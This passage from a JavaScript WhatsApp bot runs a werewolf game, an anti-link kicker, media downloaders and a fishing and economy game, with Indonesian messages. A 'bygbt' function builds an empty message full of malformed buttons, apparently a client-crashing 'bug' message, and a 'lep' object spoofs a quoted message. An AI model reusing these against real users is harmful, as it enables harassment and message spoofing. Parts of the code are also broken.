                tok1 += `[${werewolf.getPlayer(m.chat)[i].idny}] @${werewolf.getPlayer(m.chat)[i].id.replace("@s.whatsapp.net", "")}\n`
                membernya.push(werewolf.getPlayer(m.chat)[i].id)
            }
            for (let i = 0; i < werewolf.getPlayer(m.chat).length; i++) {
                tok2 += `[${werewolf.getPlayer(m.chat)[i].idny}] @${werewolf.getPlayer(m.chat)[i].id.replace("@s.whatsapp.net", "")} ${werewolf.getPlayer(m.chat)[i].role === 'werewolf' || werewolf.getPlayer(m.chat)[i].role === "sorcerer" ? `[${werewolf.getPlayer(m.chat)[i].role}]` : ''}\n`
                membernya.push(werewolf.getPlayer(m.chat)[i].id)
            }
            for (let i = 0; i < werewolf.getPlayer(m.chat).length; i++) {
                if (werewolf.getPlayer(m.chat)[i].role === "werewolf") {
                    if (werewolf.getPlayer(m.chat)[i].isdead != true) {
                        var textnya = `Kamu adalah Werewolf (Srigala) ${werewolf.emoji_role('werewolf')}, silahkan tunjuk satu orang yang ingin kamu makan pada malam hari ini\nList Player: ${tok2}`
                        let row = []
                        for (let k = 0; k < werewolf.getPlayer(m.chat).length; k++) {
                            row.push({ title: `Kill Player ${werewolf.getPlayer(m.chat)[k].idny}`, rowId: `.ww kill ${werewolf.getPlayer(m.chat)[k].idny}`, description: `Untuk membunuh player ${werewolf.getPlayer(m.chat)[k].idny}` })
                        }
                        const sections = [{ title: "Werewolf Game", rows: row }]
                        const listMessage = {
                            text: textnya,
                            footer: `Player Hidup: ${werewolf.playerHidup(werewolf.dataSesi(m.chat))} Player Mati: ${werewolf.playerMati(werewolf.dataSesi(m.chat))}`,
                            title: "Werewolf Game",
                            buttonText: "Clik here!",
                            sections,
                            mentions: membernya
                        }
                        bluz.sendMessage(werewolf.getPlayer(m.chat)[i].id, listMessage)
                    }
                } else if (werewolf.getPlayer(m.chat)[i].role === "warga") {
                    if (werewolf.getPlayer(m.chat)[i].isdead != true) {
                        let textnya = `Kamu adalah Villager (Warga/Orang Desa) ${werewolf.emoji_role('warga')}, Silakan masuk kerumah masing masing.\nList Player${tok1}`
                        bluz.sendMessage(werewolf.getPlayer(m.chat)[i].id, { text: textnya, mentions: membernya })
                    }
                } else if (werewolf.getPlayer(m.chat)[i].role === "seer") {
                    if (werewolf.getPlayer(m.chat)[i].isdead != true) {
                        let textnya = `Kamu adalah Seer (Penerawang) ${werewolf.emoji_role('seer')}. Bermodalkan kemenyan dan jampi-jampi, kamu bisa mengetahui peran pemain pilihanmu.\nList Player: ${tok1}`
                        let row = []
                        for (let k = 0; k < werewolf.getPlayer(m.chat).length; k++) {
                            row.push({ title: `Cek Player ${werewolf.getPlayer(m.chat)[k].idny}`, rowId: `.ww dreamy ${werewolf.getPlayer(m.chat)[k].idny}`, description: `Untuk melihat identitas player ${werewolf.getPlayer(m.chat)[k].idny}` })
                        }
                        const sections = [{ title: "Werewolf Game", rows: row }]
                        const listMessage = {
                            text: textnya,
                            footer: `Player Hidup: ${werewolf.playerHidup(werewolf.dataSesi(m.chat))} Player Mati: ${werewolf.playerMati(werewolf.dataSesi(m.chat))}`,
                            title: "Werewolf Game",
                            buttonText: "Clik here!",
                            sections,
                            mentions: membernya
                        }
                        bluz.sendMessage(werewolf.getPlayer(m.chat)[i].id, listMessage)
                    }
                } else if (werewolf.getPlayer(m.chat)[i].role === "guardian") {
                    if (werewolf.getPlayer(m.chat)[i].isdead != true) {
                        let textnya = `Kamu adalah Guardian Angel (Malaikat Pelindung) ${werewolf.emoji_role('guardian')}, Silahkan Pilih salah 1 player Yang ingin kamu Lindungi\nList Player: ${tok1}`
                        let row = []
                        for (let k = 0; k < werewolf.getPlayer(m.chat).length; k++) {
                            row.push({ title: `Lindungi Player ${werewolf.getPlayer(m.chat)[k].idny}`, rowId: `.ww deff ${werewolf.getPlayer(m.chat)[k].idny}`, description: `Untuk melindungi player ${werewolf.getPlayer(m.chat)[k].idny}` })
                        }
                        const sections = [{ title: "Werewolf Game", rows: row }]
                        const listMessage = {
                            text: textnya,
                            footer: `Player Hidup: ${werewolf.playerHidup(werewolf.dataSesi(m.chat))} Player Mati: ${werewolf.playerMati(werewolf.dataSesi(m.chat))}`,
                            title: "Werewolf Game",
                            buttonText: "Clik here!",
                            sections,
                            mentions: membernya
                        }
                        bluz.sendMessage(werewolf.getPlayer(m.chat)[i].id, listMessage)
                    }
                } else if (werewolf.getPlayer(m.chat)[i].role === "sorcerer") {
                    if (werewolf.getPlayer(m.chat)[i].isdead != true) {
                        let textnya = `Kamu adalah Sorcerer (Penyihir) ${werewolf.emoji_role('sorcerer')}, Silakan Pilih 1 Orang Yang Ingin kamu Buka Identitasnya\nList Player: ${tok2}`
                        let row = []
                        for (let k = 0; k < werewolf.getPlayer(m.chat).length; k++) {
                            row.push({ title: `Cek Player ${werewolf.getPlayer(m.chat)[k].idny}`, rowId: `.ww sorcerer ${werewolf.getPlayer(m.chat)[k].idny}`, description: `Untuk melihat identitas player ${werewolf.getPlayer(m.chat)[k].idny}` })
                        }
                        const sections = [{ title: "Werewolf Game", rows: row }]
                        const listMessage = {
                            text: textnya,
                            footer: `Player Hidup: ${werewolf.playerHidup(werewolf.dataSesi(m.chat))} Player Mati: ${werewolf.playerMati(werewolf.dataSesi(m.chat))}`,
                            title: "Werewolf Game",
                            buttonText: "Clik here!",
                            sections,
                            mentions: membernya
                        }
                        bluz.sendMessage(werewolf.getPlayer(m.chat)[i].id, listMessage)
                    }
                }
            }
            run(bluz, m.chat)
            bluz.sendMessage(m.chat, { text: 'Game berhasil dimulai!' })
        } else if (aff == 'exit') {
            if (werewolf.checkData(m.chat) === false) return bluz.sendMessage(m.chat, { text: "Tidak Ada *Sesi*" }, { quoted: m })
            if (werewolf.checkPlayer(m.chat, m.sender)) return bluz.sendMessage(m.chat, { text: "Belum masuk *Sesi*" }, { quoted: m })
            if (werewolf.checkallData(m.chat).status === true) return bluz.sendMessage(m.chat, { text: "Game Sudah Dimulai" }, { quoted: m })
            werewolf.playerExit(m.chat, m.sender)
            bluz.sendMessage(m.chat, { text: "Exit ✅" }, { quoted: m })
        } else if (aff == 'delete') {
            if (werewolf.checkData(m.chat) === false) return bluz.sendMessage(m.chat, { text: "Tidak Ada *Sesi*" }, { quoted: m })
            if (werewolf.checkPlayer(m.chat, m.sender)) return bluz.sendMessage(m.chat, { text: "Belum masuk *Sesi*" }, { quoted: m })
            if (werewolf.checkallData(m.chat).status === true) return bluz.sendMessage(m.chat, { text: "Game sudah Dimulai" }, { quoted: m })
            if (werewolf.isOwnerww) {
                werewolf.ExitGame(sesi)
                bluz.sendMessage(m.chat, { text: "Sesi Telah Dihapus" }, { quoted: m })
            } else {
                bluz.sendMessage(m.chat, { text: "Hanya Yang Memulai Game Saja Bisa Menghapus Sesi" }, { quoted: m })
            }
        }
    }    
	// auto set bio
	if (db.data.settings[botNumber].autobio) {
	    let setting = global.db.data.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await bluz.updateProfileStatus(`${bluz.user.name} | Runtime : ${runtime(uptime)}`)
		setting.status = new Date() * 1
	    }
	}
	    
	  // Anti Link
        if (isAntilink) {
        if (budy.match(`chat.whatsapp.com`)) {
        m.reply(`「 ANTI LINK 」\n\nKamu terdeteksi mengirim link group, maaf kamu akan di kick !`)
        if (!isBotAdmins) return m.reply(`Ehh bot gak admin T_T`)
        let gclink = (`https://chat.whatsapp.com/`+await bluz.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return m.reply(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
        if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
        if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
        bluz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }

        //antivirtex by xeon
        if (!isAntiVirtex) {
        if (budy.length > 3500) {
        m.reply(`Seseorang Berwujud anjing, Mespam Virus ï¸\n`.repeat(300))
        m.reply(`\`\`\`ã€Œ Virus Detected ã€\`\`\`\n\nSorry You Will Be Kicked !`)
        if (!isBotAdmins) return m.reply(mess.botAdmin)
        bluz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }

        // if (budy.length > 1500){
        //     if (!isAntiVirtex) return
        //     if (!isBotAdmins) throw mess.botAdmin
        //     m.reply(`Seseorang Berwujud anjing, Mespam Virus ï¸\n`.repeat(300))
        //     var kic = `${sender.split("@")[0]}@s.whatsapp.net`
        //     setTimeout( () => {
        //     bluz.groupParticipantsUpdate(m.chat, kic, 'remove')
        //     }, 0)
        //     }

        // GAK BISA DI PAKE KARENA YTM3 LINK YOUTUBE MASIH KEDETEKSI
        // if ( body.match('youtu.be') ) {
        //     sleep(5000)
        //     if (!isPremium && global.db.data.users[m.sender].limit < 15) return m.reply(mess.endLimit) // respon ketika limit habis
        //     db.data.users[m.sender].limit -= 15 // -1 limit
        //     m.reply(`Hanya khusus Warga Elite, Karna memakan 15 Limit, untuk Warga desa jangan gunakan fitur ini, dan limit anda akan habis`)
        //     //let url = args.join(' ').replace(/#tk /g, '')
        // try {
        //     let data = await fetchJson(`https://api.lolhuman.xyz/api/ytaudio?apikey=${lolkey}&url=${body}`)
        //     console.log(data)
        //     let hasil = data.result
        //     bluz.sendMessage(m.chat, { audio: { url: hasil.link.link }, mimetype: 'audio/mpeg' }, { quoted: m })
        //         } catch {
        //             await sleep(1000)
        //             m.reply('Fitur Youtube Server1 Sedang Error')
        //             let url = args.join(' ')
        //             let data = await fetchJson(`https://zenzapis.xyz/downloader/youtube?apikey=${zzzkey}&url=${body}`)
        //             console.log(data)
        //             let hasil = data.result
        //             bluz.sendMessage(m.chat, { audio: { url: hasil.getAudio }, mimetype: 'audio/mpeg' }, { quoted: m })
        //         }
        //     }
    
        //     if ( body.match('tiktok.com') ) {
        //         sleep(5000)
        //         if (!isPremium && global.db.data.users[m.sender].limit < 15) return m.reply(mess.endLimit) // respon ketika limit habis
        //         db.data.users[m.sender].limit -= 15 // -1 limit
        //         m.reply(`Hanya khusus Warga Elite, Karna memakan 15 Limit, untuk Warga desa jangan gunakan fitur ini, dan limit anda akan habis`)
        //         //m.reply(mess.wait)
        //         //let url = args.join(' ').replace(/#tk /g, '')
        //     try {
        //         let data = await fetchJson(`https://api.lolhuman.xyz/api/tiktok?apikey=${lolkey}&url=${body}`)
        //         let hasil = data.result
        //             if ( data.status === 200 ) 
        //                 ini_txt = `𝗧𝗶𝘁𝗹𝗲 : ${hasil.title}\n`
        //                 ini_txt += `𝗞𝗮𝘁𝗮 𝗞𝘂𝗻𝗰𝗶 : ${hasil.keywords}\n` 
        //                 ini_txt += `𝗗𝗲𝘀𝗸𝗿𝗶𝗽𝘀𝗶 : ${hasil.description}\n`
        //                 ini_txt += `𝗗𝘂𝗿𝗮𝘀𝗶 : ${hasil.duration} Detik\n`
        //                 ini_txt += `𝗔𝘂𝘁𝗵𝗼𝗿 : ${hasil.author.nickname}\n`
        //                 ini_txt += `𝗗𝗶𝗹𝗶𝗵𝗮𝘁 : ${hasil.statistic.like_count}\n`
        //                 ini_txt += `𝗗𝗶𝘀𝗵𝗮𝗿𝗲 : ${hasil.statistic.share_count}\n`
        //                 ini_txt += `𝗖𝗼𝗺𝗺𝗲𝗻𝘁 : ${hasil.statistic.comment_count}\n`
        //                 ini_txt += `𝙑𝙞𝙙𝙚𝙤 𝙎𝙚𝙙𝙖𝙣𝙜 𝘿𝙞𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙 𝙃𝙖𝙧𝙖𝙥 𝙏𝙪𝙣𝙜𝙜𝙪 !!!`
        //             await bluz.sendMessage(m.chat, { video : { url : hasil.link }, caption : ini_txt }, { quoted: m })
        //             //await sleep(2000)
        //             //await bluz.sendMessage(m.chat, { video: { url: hasil.link }}, { quoted: m })
        //         } catch {
        //             m.reply('Fitur Tiktok Server1 Sedang Error')
        //             let data = await fetchJson(`https://zenzapis.xyz/downloader/musically?apikey=${zzzkey}&url=${body}`)
        //             console.log(data)
        //             let hasil = data.result
        //             await bluz.sendMessage(m.chat, { video: { url: hasil.url_nowm }, caption : 'Tiktok Download Sucses Tuan 👑'}, {quoted: m })
        //                 }
        //         }


            // if ( body.match('tiktok.com') )
            // if ( body.includes('tiktok.com') )
            //     sleep(5000)
//                 if (!isPremium && global.db.data.users[m.sender].limit < 3) return m.reply(mess.endLimit) // respon ketika limit habis
//                 m.reply(mess.wait)
// fetchJson(`https://api.lolhuman.xyz/api/tiktok?apikey=${lolkey}&url=${body}`).then(async(data)=> {
//         let hasil = data.result        
//         ini_txt = `𝗧𝗶𝘁𝗹𝗲 : ${hasil.title}\n`
//         ini_txt += `𝗞𝗮𝘁𝗮 𝗞𝘂𝗻𝗰𝗶 : ${hasil.keywords}\n`
//         ini_txt += `𝗗𝗲𝘀𝗸𝗿𝗶𝗽𝘀𝗶 : ${hasil.description}\n`
//         await bluz.sendMessage(m.chat, { video : { url : hasil.link }, caption : ini_txt }, { quoted: m })
// }).catch(d => {
//         fetchJson(`https://zenzapis.xyz/downloader/musically?apikey=${zzzkey}&url=${body}`).then(async (data2) => {
//                 console.log(1)
//                 console.log(data2)
//                 let hasil2 = data2.result
//                 await bluz.sendMessage(m.chat, { video: { url: hasil2.url_nowm2 }, caption : 'Tiktok Download Sucses'}, {quoted: m })
//         }).catch(async(e) => {
//                 fetchJson(`https://zenzapis.xyz/downloader/musically?apikey=${zzzkey}&url=${body}`).then(async (data3) => {
//                         console.log(2)
//                         console.log(data3)
//                         let hasil2 = data3.result
//                         await bluz.sendMessage(m.chat, { video: { url: hasil2.url_nowm2 }, caption : 'Tiktok Download Sucses'}, {quoted: m })
//                 }).catch(async(f) => {
//                         fetchJson(`https://zenzapis.xyz/downloader/musically?apikey=${zzzkey}&url=${body}`).then(async (data4) => {
//                                 console.log(3)
//                                 console.log(data4)
//                                 let hasil2 = data4.result
//                                 await bluz.sendMessage(m.chat, { video: { url: hasil2.url_nowm2 }, caption : 'Tiktok Download Sucses'}, {quoted: m })
//                         }).catch(async(g) => {
//                                 fetchJson(`https://zenzapis.xyz/downloader/musically?apikey=${zzzkey}&url=${body}`).then(async (data5) => {
//                                         console.log(4)
//                                         console.log(data5)
//                                         let hasil2 = data5.result
//                                         await bluz.sendMessage(m.chat, { video: { url: hasil2.url_nowm }, caption : 'Tiktok Download Sucses 5'}, {quoted: m })
//                                 }).catch(h => {                
//                                         m.reply('kelima server sedang error')
//                                 })
//                         })
//                 })
//         })
// })
//                 m.reply(mess.wait)
// fetchJson(`https://api.lolhuman.xyz/api/tiktok?apikey=${lolkey}&url=${body}`).then(async(data)=> {
//         let hasil = data.result        
//                     ini_txt = `𝗧𝗶𝘁𝗹𝗲 : ${hasil.title}\n`
//                     ini_txt += `𝗞𝗮𝘁𝗮 𝗞𝘂𝗻𝗰𝗶 : ${hasil.keywords}\n` 
//                     ini_txt += `𝗗𝗲𝘀𝗸𝗿𝗶𝗽𝘀𝗶 : ${hasil.description}\n`
//                     ini_txt += `𝗗𝘂𝗿𝗮𝘀𝗶 : ${hasil.duration} Detik\n`
//                     ini_txt += `𝗔𝘂𝘁𝗵𝗼𝗿 : ${hasil.author.nickname}\n`
//                     ini_txt += `𝗗𝗶𝗹𝗶𝗵𝗮𝘁 : ${hasil.statistic.like_count}\n`
//                     ini_txt += `𝗗𝗶𝘀𝗵𝗮𝗿𝗲 : ${hasil.statistic.share_count}\n`
//                     ini_txt += `𝗖𝗼𝗺𝗺𝗲𝗻𝘁 : ${hasil.statistic.comment_count}\n`
//                     ini_txt += `𝙑𝙞𝙙𝙚𝙤 𝙎𝙚𝙙𝙖𝙣𝙜 𝘿𝙞𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙 𝙃𝙖𝙧𝙖𝙥 𝙏𝙪𝙣𝙜𝙜𝙪 !!!`
//         await bluz.sendMessage(m.chat, { video : { url : hasil.link }, caption : ini_txt }, { quoted: m })
// }).catch(f => {
//         fetchJson(`https://zenzapis.xyz/downloader/musically?apikey=382738388&url=${body}`).then(async (data2) => {
//                 console.log(data2)
//                 let hasil2 = data2.result
//                 await bluz.sendMessage(m.chat, { video: { url: hasil2.url_nowm }, caption : 'Tiktok Download Sucses'}, {quoted: m })
//         }).catch(e => {
//                m.reply('Server Tiktok 2 Sedang Error')
//         })
// }).catch(f => {
//         fetchJson(`https://zenzapis.xyz/downloader/musically?apikey=${zzzkey}&url=${body}`).then(async (data3) => {
//                 console.log(data2)
//                 let hasil3 = data3.result
//                 await bluz.sendMessage(m.chat, { video: { url: hasil2.url_nowm }, caption : 'Tiktok Download Sucses'}, {quoted: m })
//         }).catch(e => {
//                m.reply('Server Tiktok 3 Sedang Error')
//         })
// }).catch(f => {
//         fetchJson(`https://zenzapis.xyz/downloader/musically?apikey=${zzzkey}&url=${body}`).then(async (data2) => {
//                 console.log(data2)
//                 let hasil2 = data2.result
//                 await bluz.sendMessage(m.chat, { video: { url: hasil2.url_nowm2 }, caption : 'Tiktok Download Sucses'}, {quoted: m })
//         }).catch(e => {
//                 m.reply('Server Tiktok 4 Sedang Error')
//         })
// }).catch(f => {
//         fetchJson(`https://zenzapis.xyz/downloader/musically?apikey=${zzzkey}&url=${body}`).then(async (data2) => {
//                 console.log(data2)
//                 let hasil2 = data2.result
//                 await bluz.sendMessage(m.chat, { video: { url: hasil2.url_nowm2 }, caption : 'Tiktok Download Sucses'}, {quoted: m })
//         }).catch(e => {
//                 m.reply('Server Tiktok 5 Sedang Error')
//         })
// })
        //         m.reply(mess.wait)
        // fetchJson(`https://api.lolhuman.xyz/api/tiktok?apikey=${lolkey}&url=${body}`).then(async(data)=> {
        //         let hasil = data.result
        //         if ( data.status === 200 ){
        //                 ini_txt = `𝗧𝗶𝘁𝗹𝗲 : ${hasil.title}\n`
        //                 ini_txt += `𝗞𝗮𝘁𝗮 𝗞𝘂𝗻𝗰𝗶 : ${hasil.keywords}\n `
        //                 ini_txt += `𝗗𝗲𝘀𝗸𝗿𝗶𝗽𝘀𝗶 : ${hasil.description}\n`
        //                 await bluz.sendMessage(m.chat, { video : { url : hasil.link }, caption : ini_txt }, { quoted: m })
        //         } else {
        //                 fetchJson(`https://zenzapis.xyz/downloader/musically?apikey=${zzzkey}&url=${body}`).then(async(data1) => {
        //                         console.log(data)
        //                         let hasil = data.result
        //                         await bluz.sendMessage(m.chat, { video: { url: hasil.url_nowm2 }, caption : 'Tiktok Download Sucses'}, {quoted: m })
        //                 }).catch(e => {
        //                         m.reply('kedua server sedang error')
        //                 })
        //         }
        // }).catch(f => {
        //         fetchJson(`https://zenzapis.xyz/downloader/musically?apikey=${zzzkey}&url=${body}`).then(async (data1) => {
        //                         console.log(data1)
        //                         let hasil2 = data1.result
        //                         await bluz.sendMessage(m.chat, { video: { url: hasil2.url_nowm2 }, caption : 'Tiktok Download Sucses'}, {quoted: m })
        //                 }).catch(e => {
        //                         m.reply('kedua server sedang error')
        //                 })
        // })
                // fetchJson(`https://api.lolhuman.xyz/api/tiktok?apikey=${lolkey}&url=${body}`).then(data => {
                //         let hasil = data.result
                //         if ( data.status === 200 ){
                //                 ini_txt = `𝗧𝗶𝘁𝗹𝗲 : ${hasil.title}\n`
                //                 ini_txt += `𝗞𝗮𝘁𝗮 𝗞𝘂𝗻𝗰𝗶 : ${hasil.keywords}\n `
                //                 ini_txt += `𝗗𝗲𝘀𝗸𝗿𝗶𝗽𝘀𝗶 : ${hasil.description}\n`
                //                 await bluz.sendMessage(m.chat, { video : { url : hasil.link }, caption : ini_txt }, { quoted: m })
                //         } else {
                //                 fetchJson(`https://zenzapis.xyz/downloader/musically?apikey=${zzzkey}&url=${body}`).then(data1 => {
                //                         console.log(data)
                //                         let hasil = data.result
                //                         await bluz.sendMessage(m.chat, { video: { url: hasil.url_nowm2 }, caption : 'Tiktok Download Sucses'}, {quoted: m })
                //                 }).catch(e => {
                //                         m.reply('kedua server sedang error')
                //                 })
                //         }
                // }).catch(f => {
                //         fetchJson(`https://zenzapis.xyz/downloader/musically?apikey=${zzzkey}&url=${body}`).then(data1 => {
                //                         console.log(data1)
                //                         let hasil2 = data1.result
                //                         await bluz.sendMessage(m.chat, { video: { url: hasil2.url_nowm2 }, caption : 'Tiktok Download Sucses'}, {quoted: m })
                //                 }).catch(e => {
                //                         m.reply('kedua server sedang error')
                //                 })
                // })
            
            //     //let url = args.join(' ').replace(/#tk /g, '')
            // try {
            //     let data = await fetchJson(`https://api.lolhuman.xyz/api/tiktok?apikey=${lolkey}&url=${body}`)
            //     let hasil = data.result
            //         if ( data.status === 200 ) 
            //             ini_txt = `𝗧𝗶𝘁𝗹𝗲 : ${hasil.title}\n`
            //             ini_txt += `𝗞𝗮𝘁𝗮 𝗞𝘂𝗻𝗰𝗶 : ${hasil.keywords}\n` 
            //             ini_txt += `𝗗𝗲𝘀𝗸𝗿𝗶𝗽𝘀𝗶 : ${hasil.description}\n`
            //         await bluz.sendMessage(m.chat, { video : { url : hasil.link }, caption : ini_txt }, { quoted: m })
            //         //await sleep(2000)
            //         //await bluz.sendMessage(m.chat, { video: { url: hasil.link }}, { quoted: m })
            //     } catch {
            //         m.reply('Fitur Tiktok Server1 Sedang Error')
            //         let data = await fetchJson(`https://zenzapis.xyz/downloader/musically?apikey=${zzzkey}&url=${body}`)
            //         console.log(data)
            //         let hasil = data.result
            //         await bluz.sendMessage(m.chat, { video: { url: hasil.url_nowm2 }, caption : 'Tiktok Download Sucses'}, {quoted: m })
            //             }
            //     }





            if ( body.match('facebook.com') ) {
                sleep(5000)
                if (!isPremium && global.db.data.users[m.sender].limit < 25) return m.reply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 25 // -1 limit
                m.reply(mess.waitprem)
                //let url = args.join(' ').replace(/#tk /g, '')
            try {
                let data = await fetchJson(`https://api.lolhuman.xyz/api/facebook?apikey=${lolkey}&url=${body}`)
                    console.log(data)
                        let hasil = data.result
                        if ( data.status === 200 ) {
                    await sleep(1000)
                    await bluz.sendMessage(m.chat, { video: { url: hasil }}, { quoted: m })}
                } catch {
                    m.reply('Fitur Tiktok Server1 Sedang Error')
                    let data1 = await fetchJson(`https://zenzapis.xyz/downloader/facebook?apikey=${zzzkey}&url=${body}`)
                    console.log(data1)
                        let hasil = data1.result
                    await sleep(1000)
                    await bluz.sendMessage(m.chat, { video: { url: hasil.video }, mimetype: 'video/mp4' }, { quoted: m })
                    }
                }

      // Mute Chat
      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }

        // Respon Cmd with media
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: bluz.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, bluz.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        bluz.ev.emit('messages.upsert', msg)
        }

        async function bygbt(text) {
            bluz.sendMessage(text, {
            text: '', 
            templateButtons: [
            { callButton: { displayText: `P`, phoneNumber: ``}},
            { urlButton: { displayText: `P`, url: `https://wa.me/`}},
            { urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
            { quickReplyButton: { displayText: `P`, id: ``}},
            { quickReplyButton: { displayText: `P`, id: ``}},
            { quickReplyButton: { displayText: `P`, id: ``}},
            ]})
            }

        const lep = {
            key: {
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
            }, 
            message: { 
            "imageMessage": { 
            "mimetype": "image/jpeg", 
            "caption": `Bluz Bot WhatsApp`, 
            "jpegThumbnail": ppnyauser
            }
            }
            }

	    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	    for (let jid of mentionUser) {
            let user = global.db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            m.reply(`
Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
        }

        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            bluz.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}`)
            user.afkTime = -1
            user.afkReason = ''
        }
        switch(command) {
            case 'reset':
run.kill()
isRunning = false
start.apply(this, arguments)
break
                case 'daily':
                    if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m})
                    if (isDaily) return m.reply('Anda sudah melakukan login harian, sihlakan anda login besok kembali')
                    //const serialUser = createSerial(18)   
                    const anuuh3 = `*「  𝑫𝑨𝑰𝑳𝒀 𝑳𝑶𝑮𝑰𝑵  」*
*Anda sudah login hari ini, dan anda mendapatkan*\n
*● Nama:* ${pushname}
*● Kamu Mendapatkan:* Rp.${http1}`
                    daily.addData(dbdaily, sender)
                    adduangUser(sender, http1, uang)
                    Imgnah = await getBuffer(`https://static.wikia.nocookie.net/mysingingmonsters/images/8/81/Daily_Login_3.5.0-wave4.png`)
                    bluz.sendMessage(from, { caption: anuuh3, image: Imgnah })
                break
                case 'mybag':
                    case 'cekinven':
                    case 'inventori':
                    case 'myinventori':
                        if (!m.isGroup) throw mess.group
                        const kantong2 = checkuangUser(sender)
                        m.reply(
`◤📍 𝗣𝗿𝗼𝗳𝗶𝗹𝗲 𝗣𝗹𝗮𝘆𝗲𝗿 ◢
➜ Nama : ${pushname}
➜ Rank :
➜ Status :
🎒 𝗜𝗻𝘃𝗲𝗻𝘁𝗼𝗿𝗶 :
• Uang : Rp.${kantong2} 💰
• Emas : 🪙
• Besi : ⛓️
• Berlian : 💎
• Ikan : ${getFish(sender)} 🎣
• Umpan : ${getUmpan(sender)} 🪱`)
                          //but = [{ buttonId: `!adventure`, buttonText: { displayText: 'Adventure' }, type: 1 }]
                          //sendButton(from, done, 'Inventori User', but)
                          break
                case 'mancing':
                    if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m})	
                    if (!m.isGroup) throw mess.group
                    if ( getUmpan(sender) <= 0) return m.reply(mess.endUmpan)
                    sellUmpan(sender, 1) 
                    m.reply(`1 Umpan Terpakai \n Tersisa ${getUmpan(sender)} Umpan 🪱 `)
                    ikannya = Fish[Math.floor(Math.random() * Fish.length)]          
                    //receh = randomNomor(500)	    
                    ditangkap = Math.ceil(Math.random() * 50)
                    cing = await getBuffer(`https://telegra.ph/file/d9b15de4f661808dfd0b9.jpg`)
                    setTimeout( () => {
                    const pish = `「 Memancing 」\n\n • Tangkapan : ${ikannya}\n • Total Dapat : ${ditangkap} Ikan\n • MONEY : $${receh}\n`
                    but = [
                    { buttonId: '!mancing', buttonText: { displayText: 'Mancing lagi' }, type: 1 },
                    { buttonId: '!myinventori', buttonText: { displayText: 'Cek Inventori' }, type: 1 }
                     ]
                    bluz.sendMessage(from, { caption: pish, image: cing, templateButtons: but, footer: `© ${global.botname}`, mentions: [sender] })
                    }, 7000)
                    setTimeout( () => {
                    m.reply(`🎣 Meanarik kail. . . 🎣`)
                    }, 6000) // 1000 = 1s,
                    setTimeout( () => {
                    m.reply(`🐟 Berhasil mendapatkan ikan 🐟`)
                    }, 5000) // 1000 = 1s,
                    setTimeout( () => {
                    m.reply(`𓆝 𓆟 𓆞 𓆝 𓆟`)
                    }, 3000)
                    setTimeout( () => {
                        m.reply(`🎣 Mulai memancing. . . 🎣`)
                    }, 1500) // 1000 = 1s,
                    addFish(sender, ditangkap)
                    //adduangUser(sender, receh, uang)
                    break
                    case 'sellikan':
                    case 'jualikan':
                        m.reply('Gunakan prefix agar item bisa terjual. contoh: #jualikan 7')
                        await sleep(2000)
                        if (args.length < 1) return m.reply(`Kirim perintah *${prefix + command}* jumlah yang ingin dijual`)      
                        jmlh = body.slice(10)
                        rp = 5 * jmlh
                        if (getFish(sender) < jmlh) return m.reply(`Ikan Kamu Tidak Cukup`)
                        sellFish(sender, jmlh, uang)
                        adduangUser(sender, rp, uang) 
                        m.reply(`🛒 𝗣𝗔𝗦𝗔𝗥\n • Penjual : ${pushname}\n • Pembeli : Admin\n • Harga/Ikan : 5\n • Status : Sukses\n • Sisa Ikan : ${getFish(sender)}\n • Hasil Penjualan : $${rp}`)  
                        break
                    case 'transfer':
                        case 'tf':
                            if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                             if (args.length < 2) return m.reply(`Kirim perintah *${command}* @tag nominal\nContoh : ${command} @0 2000`)
                             if (!args[0]) return m.reply(`Tag orang yang ingin di transfer balance`)
                             if (!args[1]) return m.reply(`Masukkan nominal nya!`)
                             if (isNaN(parseInt(args[1]))) return m.reply(`Nominal harus berupa angka!`)
                             //if (args[2].toLowerCase() === 'infinity') return reply(Yahaha saya ndak bisa di tipu)
                             var anu = checkuangUser(sender)
                             if(parseInt(args[1]) < 1) return m.reply('Nominal harus lebih dari 1!')
